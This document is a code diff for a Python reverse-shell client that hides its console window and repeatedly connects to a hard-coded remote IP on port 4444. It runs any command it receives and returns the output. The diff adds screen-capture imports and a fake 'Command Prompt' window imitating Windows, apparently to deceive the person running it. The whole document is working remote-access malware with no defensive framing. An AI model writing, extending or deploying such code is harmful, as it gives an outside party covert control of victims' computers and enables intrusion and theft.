@@ -1,31 +1,65 @@
 import socket
-import time
+import subprocess
+import threading
 import os
+import sys
+import time
 import ctypes
+import shutil
+from PIL import ImageGrab
+import pyautogui
+import io
+import tkinter as tk
+from tkinter import scrolledtext
 
-SERVER_HOST = '152.53.182.180'
+# ============= CONFIG =============
+SERVER_HOST = '152.53.182.180'   # Make sure this is correct
 SERVER_PORT = 4444
+# ==================================
+
+viewing = False
 
 def hide_console():
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    if os.name == 'nt':
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-print("[+] Client Started - Trying to connect...")
-
-while True:
-    try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.settimeout(8)
-        client.connect((SERVER_HOST, SERVER_PORT))
-        print("[+] SUCCESS! Connected to VPS")
-        
-        while True:
-            cmd = client.recv(4096).decode('utf-8', errors='ignore').strip()
-            if cmd:
-                print(f"Received command: {cmd}")
+def connect_to_vps():
+    while True:
+        try:
+            print("[+] Trying to connect to VPS...")
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client.settimeout(10)
+            client.connect((SERVER_HOST, SERVER_PORT))
+            print("[+] Connected to VPS successfully!")
+            
+            while True:
+                cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
+                if not cmd:
+                    continue
                 if cmd.lower() == 'exit':
                     break
-                output = os.popen(cmd).read()
-                client.send(output.encode() if output else b'[+] Done')
-    except Exception as e:
-        print(f"[-] Connection failed: {e}")
-        time.sleep(5)
+                elif cmd == 'view':
+                    viewing = True
+                elif cmd == 'stopview':
+                    viewing = False
+                else:
+                    output = subprocess.getoutput(cmd)
+                    client.send((output or '[+] Done').encode())
+        except:
+            time.sleep(5)
+
+if __name__ == "__main__":
+    hide_console()
+    threading.Thread(target=connect_to_vps, daemon=True).start()
+    
+    # Open fake terminal
+    root = tk.Tk()
+    root.title("Command Prompt")
+    root.geometry("900x580")
+    root.configure(bg='black')
+    tk.Label(root, text="Microsoft Windows [Version 10.0.19045.1234]", bg='black', fg='white').pack(fill='x')
+    text_area = scrolledtext.ScrolledText(root, bg='black', fg='#00ff00')
+    text_area.pack(fill='both', expand=True)
+    entry = tk.Entry(root, bg='black', fg='#00ff00')
+    entry.pack(fill='x')
+    root.mainloop()
